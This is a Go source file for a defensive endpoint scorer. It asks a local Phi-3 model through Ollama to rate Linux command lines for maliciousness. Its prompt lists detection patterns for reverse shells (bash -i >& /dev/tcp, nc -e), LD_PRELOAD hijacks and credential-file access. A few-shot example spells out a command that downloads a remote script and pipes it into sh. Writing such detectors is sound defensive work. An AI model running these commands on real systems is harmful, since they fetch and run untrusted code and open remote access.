@@ -1,0 +1,243 @@
+package main
+
+import (
+	"bytes"
+	"context"
+	"encoding/json"
+	"errors"
+	"fmt"
+	"io"
+	"net/http"
+	"strings"
+	"time"
+)
+
+// Scorer is the seam between main.go and any backend. OllamaClient (real model)
+// and MockScorer (keyword heuristic) both satisfy it, so swapping backends never
+// touches the pipeline in main.go.
+type Scorer interface {
+	Score(ctx context.Context, e ExecEvent) (ScoreResult, error)
+	Name() string
+}
+
+// systemPrompt frames Phi-3 as a Linux endpoint analyst and pins the output
+// shape. Phi-3 is small, so accuracy is won here — keep it Linux-oriented and
+// expand the tradecraft hints / few-shot pairs over time (Step C).
+const systemPrompt = `You are a Linux endpoint security analyst. You are given a single process execution (the command line plus a little context) and must judge how likely it is to be malicious.
+
+Reply with ONLY a single JSON object, no prose, with exactly these keys:
+{"risk_score": <float 0..1, probability the command is malicious>,
+ "verdict": "benign"|"suspicious"|"malicious",
+ "reason": "<short human explanation>",
+ "mitre": ["<MITRE ATT&CK technique IDs, e.g. T1059>"],
+ "risk_indicators": ["<short tokens, e.g. curl|sh>"]}
+
+Linux tradecraft that raises risk:
+- piping a downloader into a shell (curl/wget ... | sh|bash)
+- executing from world-writable/temp dirs (/tmp, /dev/shm, /var/tmp)
+- base64/xxd/openssl-decoded payloads fed to an interpreter
+- reverse shells (bash -i >& /dev/tcp/..., nc -e, mkfifo+sh)
+- LD_PRELOAD / LD_LIBRARY_PATH hijacks
+- touching credentials/persistence (/etc/shadow, ~/.ssh, cron, systemd units)
+- chmod +x on a freshly dropped file
+
+Benign administrative commands (package managers, ls, cat, git, normal service
+restarts) should score LOW even when they superficially resemble the above.`
+
+// fewShot pairs teach the line between benign and malicious. Include benign
+// twins of malicious commands. Pull more from the SENTRY corpus during tuning.
+var fewShot = []struct {
+	Command string
+	JSON    string
+}{
+	{
+		Command: "apt-get update",
+		JSON:    `{"risk_score":0.03,"verdict":"benign","reason":"routine package index refresh","mitre":[],"risk_indicators":[]}`,
+	},
+	{
+		Command: "bash -c curl -fsSL http://10.0.0.9/s.sh | sh",
+		JSON:    `{"risk_score":0.95,"verdict":"malicious","reason":"remote script downloaded and piped straight into a shell","mitre":["T1059","T1105"],"risk_indicators":["curl|sh"]}`,
+	},
+}
+
+// OllamaClient scores commands via a local Ollama server running a small model.
+type OllamaClient struct {
+	Endpoint string
+	Model    string
+	http     *http.Client
+}
+
+// NewOllamaClient builds a client for the local Ollama HTTP API.
+func NewOllamaClient(model string) *OllamaClient {
+	return &OllamaClient{
+		Endpoint: "http://localhost:11434/api/generate",
+		Model:    model,
+		http:     &http.Client{Timeout: 60 * time.Second},
+	}
+}
+
+// Name identifies the backend in logs.
+func (c *OllamaClient) Name() string { return "ollama:" + c.Model }
+
+type ollamaRequest struct {
+	Model   string         `json:"model"`
+	Prompt  string         `json:"prompt"`
+	Stream  bool           `json:"stream"`
+	Options map[string]any `json:"options"`
+}
+
+type ollamaResponse struct {
+	Response string `json:"response"`
+	Done     bool   `json:"done"`
+}
+
+// Score sends the command to the model and parses its JSON verdict. temperature
+// is pinned to 0 for repeatable verdicts.
+func (c *OllamaClient) Score(ctx context.Context, e ExecEvent) (ScoreResult, error) {
+	reqBody, err := json.Marshal(ollamaRequest{
+		Model:   c.Model,
+		Prompt:  buildPrompt(e),
+		Stream:  false,
+		Options: map[string]any{"temperature": 0},
+	})
+	if err != nil {
+		return ScoreResult{}, err
+	}
+
+	req, err := http.NewRequestWithContext(ctx, http.MethodPost, c.Endpoint, bytes.NewReader(reqBody))
+	if err != nil {
+		return ScoreResult{}, err
+	}
+	req.Header.Set("Content-Type", "application/json")
+
+	resp, err := c.http.Do(req)
+	if err != nil {
+		return ScoreResult{}, fmt.Errorf("ollama request: %w", err)
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return ScoreResult{}, err
+	}
+	if resp.StatusCode != http.StatusOK {
+		return ScoreResult{}, fmt.Errorf("ollama status %d: %s", resp.StatusCode, strings.TrimSpace(string(body)))
+	}
+
+	var or ollamaResponse
+	if err := json.Unmarshal(body, &or); err != nil {
+		return ScoreResult{}, fmt.Errorf("decode ollama envelope: %w", err)
+	}
+	return parseResult(or.Response)
+}
+
+// buildPrompt assembles the full prompt: system framing, few-shot pairs, and the
+// command under test with any high-signal context (cwd, LD_PRELOAD).
+func buildPrompt(e ExecEvent) string {
+	var b strings.Builder
+	b.WriteString(systemPrompt)
+	b.WriteString("\n\nExamples:\n")
+	for _, ex := range fewShot {
+		fmt.Fprintf(&b, "COMMAND: %s\nJSON: %s\n", ex.Command, ex.JSON)
+	}
+	b.WriteString("\nNow score this execution. Respond with ONLY the JSON object.\n")
+	fmt.Fprintf(&b, "executable: %s\n", e.Executable)
+	if e.ParentComm != "" {
+		fmt.Fprintf(&b, "parent: %s\n", e.ParentComm)
+	}
+	if e.CWD != nil && *e.CWD != "" {
+		fmt.Fprintf(&b, "cwd: %s\n", *e.CWD)
+	}
+	if e.LDPreload != nil && *e.LDPreload != "" {
+		fmt.Fprintf(&b, "LD_PRELOAD: %s\n", *e.LDPreload)
+	}
+	fmt.Fprintf(&b, "COMMAND: %s\nJSON: ", e.CommandLine())
+	return b.String()
+}
+
+// rawResult is the model's expected JSON shape. risk_score is a pointer so we
+// can tell "absent" from "0".
+type rawResult struct {
+	RiskScore      *float64 `json:"risk_score"`
+	Verdict        string   `json:"verdict"`
+	Reason         string   `json:"reason"`
+	Mitre          []string `json:"mitre"`
+	RiskIndicators []string `json:"risk_indicators"`
+}
+
+// parseResult extracts the JSON object from the model's output (even if wrapped
+// in prose), clamps risk_score to [0,1], and fills a missing verdict from the
+// banded score.
+func parseResult(text string) (ScoreResult, error) {
+	js, err := extractJSON(text)
+	if err != nil {
+		return ScoreResult{}, err
+	}
+
+	var raw rawResult
+	if err := json.Unmarshal([]byte(js), &raw); err != nil {
+		return ScoreResult{}, fmt.Errorf("parse model JSON: %w", err)
+	}
+
+	score := 0.0
+	if raw.RiskScore != nil {
+		score = *raw.RiskScore
+	}
+	if score < 0 {
+		score = 0
+	}
+	if score > 1 {
+		score = 1
+	}
+
+	verdict := strings.TrimSpace(raw.Verdict)
+	if verdict == "" {
+		verdict = verdictForScore(score)
+	}
+
+	return ScoreResult{
+		RiskScore:      score,
+		Verdict:        verdict,
+		Reason:         strings.TrimSpace(raw.Reason),
+		Mitre:          raw.Mitre,
+		RiskIndicators: raw.RiskIndicators,
+	}, nil
+}
+
+// extractJSON pulls the first balanced {...} object out of arbitrary text,
+// ignoring braces inside JSON strings.
+func extractJSON(text string) (string, error) {
+	start := strings.IndexByte(text, '{')
+	if start < 0 {
+		return "", errors.New("no JSON object in model output")
+	}
+	depth := 0
+	inStr := false
+	esc := false
+	for i := start; i < len(text); i++ {
+		ch := text[i]
+		if inStr {
+			switch {
+			case esc:
+				esc = false
+			case ch == '\\':
+				esc = true
+			case ch == '"':
+				inStr = false
+			}
+			continue
+		}
+		switch ch {
+		case '"':
+			inStr = true
+		case '{':
+			depth++
+		case '}':
+			depth--
+			if depth == 0 {
+				return text[start : i+1], nil
+			}
+		}
+	}
+	return "", errors.New("unbalanced JSON object in model output")
+}
